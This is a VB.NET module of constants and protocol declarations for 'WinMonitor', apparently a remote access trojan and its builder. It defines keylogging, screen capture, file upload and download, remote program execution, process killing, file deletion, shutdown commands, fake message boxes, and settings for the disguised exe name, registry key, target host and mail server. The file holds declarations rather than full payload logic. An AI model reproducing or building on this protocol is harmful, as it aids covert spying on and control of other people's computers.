


Public Module MConstantsDeclarations

#Region "Character Constants"

   Public Const IDC_CHAR0 As Char = "0"c
   Public Const IDC_CHAR9 As Char = "9"c

#End Region

#Region "String Constants"

   Public Const IDS_FILEORPATH_INVALID As String = "Invalid FileName/Path!"
   Public Const IDS_KEYLOG_SIZE_INVALID As String = "Invalid KeyLog file size!"
   Public Const IDS_BMPFILECOUNT_INVALID As String = "Unacceptable number of files!"
   Public Const IDS_TIMEINTERVAL_INVALID As String = "Unacceptable time limit!"
   Public Const IDS_PORTNUMBER_INVALID As String = "Invalid Port Number"
    Public Const IDS_IPADDRESS_INVALID As String = "Invalid IP-Address!"
    Public Const IDS_DOMAIN_INVALID As String = "Invalid Domain Name!"
   Public Const IDS_PASSWORDS_CONFLICTED As String = "Retyped password does not match to original Password!"
   Public Const IDS_EXE_INTERNALNAME_INVALID As String = "WinMonitor's internal name, Invalid!"
   Public Const IDS_EXE_FILENAME_INVALID As String = "WinMonitor's exe file name, Invalid!"
   Public Const IDS_EXE_REGISTRYNAME_INVALID As String = "WinMonitor's Registry key, Invalid!"
    Public Const IDS_EMAIL_INVALID As String = "Invalid Email-Id!"
    Public Const IDS_LISTENING_FAILED As String = "Listening failed..."
    Public Const IDS_EMAIL_SERVER_INVALID As String = "Invalid mail server!"
   Public Const IDS_EXE_TARGET_HOSTNAME_INVALID As String = "WinMonitor's targeted host name, Invalid!"
   Public Const IDS_XML_EDITING_ERROR As String = "Error during editing XML!"
   Public Const IDS_NULL_STRING As String = ""
   Public Const IDS_FILE_SLASH As String = "\"
   Public Const IDS_NONFILE_SLASH As String = "/"
   Public Const IDS_DOT As String = "."
   Public Const IDS_SPACE As String = " "
   Public Const IDS_WINMONITOR_BUILDER_QUIT As String = "Are you sure to Quit without building WinMonitor?"

#End Region

#Region "Numeric Constants"

   Public Const IDI_DIRECTORYORFILE_NAME_MAXLENGTH As Integer = 100
   Public Const IDI_BMPFILE_MAXCOUNT As Integer = 5000
   Public Const IDI_BMPFILE_MINCOUNT As Integer = 1
   Public Const IDI_LOWER_PORT As Integer = 1025
   Public Const IDI_UPPER_PORT As Integer = 65535
   Public Const IDL_KEYLOG_MAXSIZE As Long = 1100000000
   Public Const IDL_KEYLOG_MINSIZE As Long = 1
    Public Const IDL_TIME_MAXINTERVAL As Long = 50000
    Public Const IDL_TIME_MININTERVAL As Long = 1
    Public Const IDL_FILENAME_MAX_LEN As Long = 1500

#End Region

End Module

Public Module MScreenMonitorDeclarations

    Public Structure ScreenMonitorNetworkHeader
        Public TypeAndCompression As Byte
        Public Length As UInt32
    End Structure

    '-------------Screen Monitor Types & Comprn-------'

    Public Const SCREEN_MONITOR_TYPE_UNDEF As Byte = &H0
    Public Const SCREEN_MONITOR_TYPE_DIBITMAP As Byte = &H10
    Public Const SCREEN_MONITOR_TYPE_DIBITMAPFILE As Byte = &H20

    Public Const SCREEN_MONITOR_COMPRESS_NIL As Byte = &H0
    Public Const SCREEN_MONITOR_COMPRESS_LZSS As Byte = &H1

    '-------------Screen Monitor Messages-------'

    Public Const SCREEN_MONITOR_TYPE_TAKE_DESKTOP As Byte = &H30
    Public Const SCREEN_MONITOR_TYPE_TAKE_WINDOW As Byte = &H40
    Public Const SCREEN_MONITOR_TYPE_SET_COMPRESSION As Byte = &H50

    '----------------------------------------------'

    Public Function SCREEN_MONITOR_GETCOMPRESSION(ByVal bytData As Byte) As Byte
        Return (bytData And &H1)
    End Function

    Public Function SCREEN_MONITOR_GETTYPE(ByVal bytData As Byte) As Byte
        Return (bytData And &H10)
    End Function

    Public Function SCREEN_MONITOR_SETCOMPRESSION(ByVal Choice As Byte, ByRef bytData As Byte) As Byte
        bytData = ((bytData Or &H1) And (Choice Or &H10))
        Return bytData
    End Function

    Public Function SCREEN_MONITOR_SETTYPE(ByVal Choice As Byte, ByRef bytData As Byte) As Byte
        bytData = ((bytData Or &H10) And (Choice Or &H1))
        Return bytData
    End Function

End Module


Public Module MWinMonitorRequester

    Public Const WIN_MONITOR_NULL_COMMAND As Byte = &H0
    Public Const WIN_MONITOR_KEEP_ALIVE As Byte = &H1
    Public Const WIN_MONITOR_SHUTDOWN_CONNECTION As Byte = &H2
    Public Const WIN_MONITOR_GET_PWD As Byte = &H3
    Public Const WIN_MONITOR_GOT_PWD As Byte = &H4
    Public Const WIN_MONITOR_PWD_OK As Byte = &H5
    Public Const WIN_MONITOR_COMMAND_MONITOR As Byte = &H6
    Public Const WIN_MONITOR_SCREEN_MONITOR As Byte = &H7

    Public Const WIN_MONITOR_CHAT_CLIENTSERVER As Byte = &H8
    Public Const WIN_MONITOR_NORMAL_CLIENTSERVER As Byte = &H9
    Public Const WIN_MONITOR_CLIENT_ACCEPTED As Byte = &HA
    Public Const WIN_MONITOR_GET_CLIENTTYPE As Byte = &HB
    Public Const WIN_MONITOR_KEYLOG_CLIENTSERVER As Byte = &HC

End Module

Public Module MCommandMonitorClient

    Public COMMAND_MONITOR_NULL_COMMAND As UInt32 = Convert.ToUInt32(&H0)
    Public COMMAND_MONITOR_GET_LOGICAL_DRIVES As UInt32 = Convert.ToUInt32(&H10)
    Public COMMAND_MONITOR_GET_SUB_DIRS As UInt32 = Convert.ToUInt32(&H20)
    Public COMMAND_MONITOR_GET_DRIVE_TYPE As UInt32 = Convert.ToUInt32(&H30)
    Public COMMAND_MONITOR_GET_DRIVE_INFO As UInt32 = Convert.ToUInt32(&H40)
    Public COMMAND_MONITOR_GET_FILE_ASEXE As UInt32 = Convert.ToUInt32(&H50)
    Public COMMAND_MONITOR_DOWNLOAD_FILE As UInt32 = Convert.ToUInt32(&H60)
    Public COMMAND_MONITOR_DISPLAY_MSG As UInt32 = Convert.ToUInt32(&H70)
    Public COMMAND_MONITOR_SET_COMPRESSION As UInt32 = Convert.ToUInt32(&H80)

    Public COMMAND_MONITOR_GOT_LOGICAL_DRIVES As UInt32 = Convert.ToUInt32(&H90)
    Public COMMAND_MONITOR_GOT_SUB_DIRS As UInt32 = Convert.ToUInt32(&HA0)
    Public COMMAND_MONITOR_GOT_DRIVE_TYPE As UInt32 = Convert.ToUInt32(&HB0)
    Public COMMAND_MONITOR_GOT_DRIVE_INFO As UInt32 = Convert.ToUInt32(&HC0)
    Public COMMAND_MONITOR_GOT_FILE_ASEXE As UInt32 = Convert.ToUInt32(&HD0)
    Public COMMAND_MONITOR_DOWNLOADED_FILE As UInt32 = Convert.ToUInt32(&HE0)
    Public COMMAND_MONITOR_DISPLAYED_MSG As UInt32 = Convert.ToUInt32(&HF0)
    Public COMMAND_MONITOR_SET_COMPRESSION_OK As UInt32 = Convert.ToUInt32(&H100)

    '---------------------More Commands---------------'

    Public COMMAND_MONITOR_GET_WINSERVER_NAME As UInt32 = Convert.ToUInt32(&H110)
    Public COMMAND_MONITOR_GOT_WINSERVER_NAME As UInt32 = Convert.ToUInt32(&H120)
    Public COMMAND_MONITOR_GET_MAIN_MEMORY As UInt32 = Convert.ToUInt32(&H130)
    Public COMMAND_MONITOR_GOT_MAIN_MEMORY As UInt32 = Convert.ToUInt32(&H140)
    Public COMMAND_MONITOR_GET_COMPUSER_NAME As UInt32 = Convert.ToUInt32(&H150)
    Public COMMAND_MONITOR_GOT_COMPUSER_NAME As UInt32 = Convert.ToUInt32(&H160)
    Public COMMAND_MONITOR_GET_OS_VERSION As UInt32 = Convert.ToUInt32(&H170)
    Public COMMAND_MONITOR_GOT_OS_VERSION As UInt32 = Convert.ToUInt32(&H180)
    Public COMMAND_MONITOR_GET_SUB_DIR_NAMES As UInt32 = Convert.ToUInt32(&H190)
    Public COMMAND_MONITOR_GOT_SUB_DIR_NAMES As UInt32 = Convert.ToUInt32(&H1A0)
    Public COMMAND_MONITOR_GET_PROCESSLIST As UInt32 = Convert.ToUInt32(&H1B0)
    Public COMMAND_MONITOR_GOT_PROCESSLIST As UInt32 = Convert.ToUInt32(&H1C0)
    Public COMMAND_MONITOR_KILL_PROCESS As UInt32 = Convert.ToUInt32(&H1D0)
    Public COMMAND_MONITOR_KILLED_PROCESS As UInt32 = Convert.ToUInt32(&H1E0)
    Public COMMAND_MONITOR_EXEC_PROGRAM As UInt32 = Convert.ToUInt32(&H1F0)
    Public COMMAND_MONITOR_EXECD_PROGRAM As UInt32 = Convert.ToUInt32(&H200)
    Public COMMAND_MONITOR_SET_PROC_PRIORITY As UInt32 = Convert.ToUInt32(&H210)
    Public COMMAND_MONITOR_SET_PROC_PRIORITY_OK As UInt32 = Convert.ToUInt32(&H220)
    Public COMMAND_MONITOR_LOGOFF As UInt32 = Convert.ToUInt32(&H230)
    Public COMMAND_MONITOR_LOGOFF_OK As UInt32 = Convert.ToUInt32(&H240)
    Public COMMAND_MONITOR_SHUTDOWN As UInt32 = Convert.ToUInt32(&H250)
    Public COMMAND_MONITOR_SHUTDOWN_OK As UInt32 = Convert.ToUInt32(&H260)
    Public COMMAND_MONITOR_POWER_OFF As UInt32 = Convert.ToUInt32(&H270)
    Public COMMAND_MONITOR_POWER_OFF_OK As UInt32 = Convert.ToUInt32(&H280)
    Public COMMAND_MONITOR_RESTART As UInt32 = Convert.ToUInt32(&H290)
    Public COMMAND_MONITOR_RESTART_OK As UInt32 = Convert.ToUInt32(&H2A0)
    Public COMMAND_MONITOR_DELETE_FILE As UInt32 = Convert.ToUInt32(&H2B0)
    Public COMMAND_MONITOR_DELETE_FILE_OK As UInt32 = Convert.ToUInt32(&H2C0)
    Public COMMAND_MONITOR_CREATE_FOLDER As UInt32 = Convert.ToUInt32(&H2D0)
    Public COMMAND_MONITOR_CREATE_FOLDER_OK As UInt32 = Convert.ToUInt32(&H2E0)
    Public COMMAND_MONITOR_UPLOADED_FILE As UInt32 = Convert.ToUInt32(&H2F0)
    Public COMMAND_MONITOR_FILE_UPLOADED As UInt32 = Convert.ToUInt32(&H300)
    Public COMMAND_MONITOR_LISTEN_PORT As UInt32 = Convert.ToUInt32(&H310)
    Public COMMAND_MONITOR_INSTALL_KEYBOARD_FUN_PLUGIN As UInt32 = Convert.ToUInt32(&H320)
    Public COMMAND_MONITOR_INSTALLED_KEYBOARD_FUN_PLUGIN As UInt32 = Convert.ToUInt32(&H330)
    Public COMMAND_MONITOR_UNINSTALL_KEYBOARD_FUN_PLUGIN As UInt32 = Convert.ToUInt32(&H340)
    Public COMMAND_MONITOR_UNINSTALLED_KEYBOARD_FUN_PLUGIN As UInt32 = Convert.ToUInt32(&H350)
    Public COMMAND_MONITOR_OPEN_CDROM As UInt32 = Convert.ToUInt32(&H360)
    Public COMMAND_MONITOR_OPENED_CDROM As UInt32 = Convert.ToUInt32(&H370)
    Public COMMAND_MONITOR_CLOSE_CDROM As UInt32 = Convert.ToUInt32(&H380)
    Public COMMAND_MONITOR_CLOSED_CDROM As UInt32 = Convert.ToUInt32(&H390)

    '---------------------End More Commands---------------'

    Public COMMAND_MONITOR_COMPRESS_NIL As UInt32 = Convert.ToUInt32(&H0)
    Public COMMAND_MONITOR_COMPRESS_LZSS As UInt32 = Convert.ToUInt32(&H1)


    Public COMMAND_MONITOR_MSG_INFO As Byte = &H1
    Public COMMAND_MONITOR_MSG_STOP As Byte = &H2
    Public COMMAND_MONITOR_MSG_QSTN As Byte = &H3
    Public COMMAND_MONITOR_MSG_EXCL As Byte = &H4

    Public Const COMMAND_MONITOR_DRIVE_UNKNOWN As Byte = &H0
    Public Const COMMAND_MONITOR_DRIVE_NOROOT As Byte = &H1
    Public Const COMMAND_MONITOR_DRIVE_REMOVABLE As Byte = &H2
    Public Const COMMAND_MONITOR_DRIVE_FIXED As Byte = &H3
    Public Const COMMAND_MONITOR_DRIVE_CDROM As Byte = &H4
    Public Const COMMAND_MONITOR_DRIVE_RAMDISK As Byte = &H5
    Public Const COMMAND_MONITOR_DRIVE_REMOTE As Byte = &H6

    Public Const COMMAND_MONITOR_EXE_UNKNOWN As Byte = &H0
    Public Const COMMAND_MONITOR_EXE_32BIT_BINARY As Byte = &H1
    Public Const COMMAND_MONITOR_EXE_64BIT_BINARY As Byte = &H2
    Public Const COMMAND_MONITOR_EXE_DOS_BINARY As Byte = &H3
    Public Const COMMAND_MONITOR_EXE_OS216_BINARY As Byte = &H4
    Public Const COMMAND_MONITOR_EXE_PIF_BINARY As Byte = &H5
    Public Const COMMAND_MONITOR_EXE_POSIX_BINARY As Byte = &H6
    Public Const COMMAND_MONITOR_EXE_WOW_BINARY As Byte = &H7


    Public Const COMMAND_MONITOR_PROCESS_PRIORITY_NO_CHANGE As Byte = &H0
    Public Const COMMAND_MONITOR_PROCESS_PRIORITY_ABOVE_NORMAL As Byte = &H1
    Public Const COMMAND_MONITOR_PROCESS_PRIORITY_BELOW_NORMAL As Byte = &H2
    Public Const COMMAND_MONITOR_PROCESS_PRIORITY_HIGH_PRIORITY As Byte = &H3
    Public Const COMMAND_MONITOR_PROCESS_PRIORITY_IDLE_PRIORITY As Byte = &H4
    Public Const COMMAND_MONITOR_PROCESS_PRIORITY_NORMAL_PRIORITY As Byte = &H5
    Public Const COMMAND_MONITOR_PROCESS_PRIORITY_REALTIME_PRIORITY As Byte = &H6


    Public Structure FakeMessageHeader
        Dim byt_MsgType As Byte
        Dim byt_TextLen As Byte
        Dim byt_Captionlen As Byte
    End Structure

    Public Structure CommandMonitorNetworkHeader
        Dim uint32TypeAndCompression As UInt32
        Dim uint32Length As UInt32
    End Structure

    Public Function COMMAND_MONITOR_GetType(ByVal uint32Header As UInt32) As UInt32
        Return Convert.ToUInt32((Convert.ToInt32(uint32Header) And &HFFFFFFF0))
    End Function

    Public Function COMMAND_MONITOR_GetCompression(ByVal uint32Header As UInt32) As UInt32
        Return Convert.ToUInt32((Convert.ToInt32(uint32Header) And &HF))
    End Function

    Public Function COMMAND_MONITOR_SetType(ByVal Choice As UInt32, ByRef uint32Header As UInt32) As UInt32
        uint32Header = Convert.ToUInt32((Convert.ToInt32(uint32Header) Or &HFFFFFFF0) And (Convert.ToInt32(Choice) Or &HF))
        Return uint32Header
    End Function

    Public Function COMMAND_MONITOR_SetCompression(ByVal Choice As UInt32, ByRef uint32Header As UInt32) As UInt32
        uint32Header = Convert.ToUInt32((Convert.ToInt32(uint32Header) Or &HF) And (Convert.ToInt32(Choice) Or &HFFFFFFF0))
        Return uint32Header
    End Function

End Module

Public Module MFileMonitor

    Public Const CFileMonitor_FILENAME_ONLY As Byte = 1
    Public Const CFileMonitor_FILENAME_AND_SIZE As Byte = 2
    Public Const CFileMonitor_FILEINFO_DETAILED As Byte = 3

    Public Const CFileMonitor_FILETYPE_UNDEF As Byte = 0
    Public Const CFileMonitor_FILETYPE_DIR As Byte = 1
    Public Const CFileMonitor_FILETYPE_NORMAL As Byte = 2
    Public Const CFileMonitor_FILETYPE_HIDDEN As Byte = 3
    Public Const CFileMonitor_FILETYPE_TEMP As Byte = 4
    Public Const CFileMonitor_FILETYPE_ARCHIVE As Byte = 5
    Public Const CFileMonitor_FILETYPE_ENCRYPT As Byte = 6
    Public Const CFileMonitor_FILETYPE_SYSTEM As Byte = 7
    Public Const CFileMonitor_FILETYPE_READONLY As Byte = 8
    Public Const CFileMonitor_FILETYPE_OFFLINE As Byte = 9
    Public Const CFileMonitor_FILETYPE_COMPRESSED As Byte = 10

End Module

